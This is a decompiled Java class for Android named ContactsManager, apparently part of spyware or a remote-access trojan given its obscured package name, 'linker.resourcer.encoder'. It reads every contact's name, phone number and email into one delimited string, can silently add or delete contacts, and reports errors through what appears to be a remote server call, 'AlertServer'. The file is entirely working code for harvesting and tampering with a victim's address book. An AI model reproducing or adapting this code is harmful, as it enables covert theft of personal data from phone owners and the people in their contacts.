/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.ContentProviderOperation
 *  android.content.Context
 *  android.content.OperationApplicationException
 *  android.net.Uri
 *  android.os.RemoteException
 *  android.provider.ContactsContract$Data
 *  android.provider.ContactsContract$RawContacts
 */
package linker.resourcer.encoder;

import android.content.ContentProviderOperation;
import android.content.Context;
import android.content.OperationApplicationException;
import android.net.Uri;
import android.os.RemoteException;
import android.provider.ContactsContract;
import java.util.ArrayList;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.WorkerService;

public class ContactsManager {
    public static boolean Add(Context context, String string2, String string3) {
        ArrayList<ContentProviderOperation> arrayList = new ArrayList<ContentProviderOperation>();
        arrayList.add(ContentProviderOperation.newInsert((Uri)ContactsContract.RawContacts.CONTENT_URI).withValue("account_type", null).withValue("account_name", null).build());
        if (string2 != null) {
            arrayList.add(ContentProviderOperation.newInsert((Uri)ContactsContract.Data.CONTENT_URI).withValueBackReference("raw_contact_id", 0).withValue("mimetype", (Object)"vnd.android.cursor.item/name").withValue("data1", (Object)string2).build());
        }
        if (string3 != null) {
            arrayList.add(ContentProviderOperation.newInsert((Uri)ContactsContract.Data.CONTENT_URI).withValueBackReference("raw_contact_id", 0).withValue("mimetype", (Object)"vnd.android.cursor.item/phone_v2").withValue("data1", (Object)string3).withValue("data2", (Object)2).build());
        }
        try {
            context.getContentResolver().applyBatch("com.android.contacts", arrayList);
            return true;
        }
        catch (Exception exception) {
            WorkerService.MyWorker.AlertServer(context, "Add Contact", "Error:" + exception.getMessage());
            return false;
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String Load(Context object) {
        try {
            StringBuffer stringBuffer = new StringBuffer();
            object = object.getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, "has_phone_number!=0 AND (mimetype=? OR mimetype=?)", new String[]{"vnd.android.cursor.item/email_v2", "vnd.android.cursor.item/phone_v2"}, "contact_id");
            while (true) {
                if (!object.moveToNext()) {
                    object.close();
                    return stringBuffer.toString();
                }
                String string2 = object.getString(object.getColumnIndex("data1")).trim();
                if (string2 == null || string2.isEmpty() || string2.equals("null") || string2.length() <= 0) continue;
                String string3 = object.getString(object.getColumnIndex("display_name"));
                String string4 = object.getString(object.getColumnIndex("account_type_and_data_set"));
                int n = object.getInt(object.getColumnIndex("contact_id"));
                StringBuilder stringBuilder = new StringBuilder();
                stringBuffer.append(stringBuilder.append(string3).append(ConfigurationConstants.SPLIT_ARAY).append(string2).append(ConfigurationConstants.SPLIT_ARAY).append(string4).append(ConfigurationConstants.SPLIT_ARAY).append(n).append(ConfigurationConstants.SPLIT_LINE).toString());
            }
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static void Remove(Context context, String string2) {
        ArrayList<ContentProviderOperation> arrayList = new ArrayList<ContentProviderOperation>();
        context = context.getContentResolver();
        arrayList.add(ContentProviderOperation.newDelete((Uri)ContactsContract.RawContacts.CONTENT_URI).withSelection("contact_id = ?", new String[]{string2}).build());
        try {
            context.applyBatch("com.android.contacts", arrayList);
        }
        catch (OperationApplicationException operationApplicationException) {
            operationApplicationException.printStackTrace();
        }
        catch (RemoteException remoteException) {
            remoteException.printStackTrace();
        }
        arrayList.clear();
    }
}

